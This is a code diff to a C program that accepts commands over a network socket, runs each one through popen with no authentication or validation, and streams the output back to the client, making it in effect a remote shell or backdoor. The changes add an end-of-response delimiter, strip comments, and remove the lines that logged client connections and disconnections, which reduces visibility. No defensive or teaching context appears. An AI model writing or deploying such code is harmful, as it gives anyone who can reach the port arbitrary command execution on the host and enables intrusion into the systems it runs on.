@@ -9,28 +9,26 @@
 
 void execute_command(int client_socket) {
     char buffer[4096];
+    char end_delim[] = "\nEND\n";
 
     while (1) {
         memset(buffer, 0, sizeof(buffer)); // Clear the buffer for each command
 
-        // Receive the command from the client
         ssize_t bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
         if (bytes_received <= 0 || strncmp(buffer, "exit", 4) == 0) {
-            break; // Exit if no data or "exit" command is received
+            break;
         }
 
-        // Execute the command
         FILE *fp = popen(buffer, "r");
         if (!fp) {
             send(client_socket, "Failed to run command.\n", 23, 0);
             continue;
         }
 
-        // Send the command output back to the client
         while (fgets(buffer, sizeof(buffer), fp) != NULL) {
             send(client_socket, buffer, strlen(buffer), 0);
         }
-        send(client_socket, "\n", 1, 0); // Delimiter to signify end of response
+        send(client_socket, end_delim, strlen(end_delim), 0); // Send delimiter
         pclose(fp);
     }
 }
@@ -72,12 +70,9 @@ int main() {
             continue;
         }
 
-        printf("Client connected.\n");
-
         execute_command(client_socket);
 
         close(client_socket);
-        printf("Client disconnected.\n");
     }
 
     return 0;
